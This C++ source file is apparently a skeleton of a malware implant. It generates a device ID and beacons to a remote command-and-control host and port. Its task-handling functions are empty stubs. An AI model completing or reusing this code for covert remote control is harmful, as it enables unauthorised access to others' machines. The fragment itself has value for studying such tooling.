#include "implant.hpp"


#include <string>
#include <string_view>
#include <iostream>
#include <chrono>
#include <algorithm>

#include <boost/uuid/uuid_generators.hpp>
#include <boost/uuid/uuid_io.hpp>
#include <boost/property_tree/json_parser.hpp>
#include <boost/property_tree/ptree.hpp>

#include "../includes/single_include/nlohmann/json.hpp"

#include <cpr/cpr.h>

using json = nlohmann::json;

Implant::Implant(std::string host, std::string port)
{   
    /* Generate unique id */
    boost::uuids::random_generator gen;
    boost::uuids::uuid ids = gen();
    std::cout << ids << '\n';
    id = boost::uuids::to_string(ids);

    /* Allocate an API */
    api = std::make_unique<Api>(host, port);
}

void Implant::beacon() {
    api->register_device(id, "frogy");
}

void Implant::set_running(bool isRunning)
{
}

void Implant::service_tasks()
{
}

void Implant::parse_response(const std::string &response)
{
}
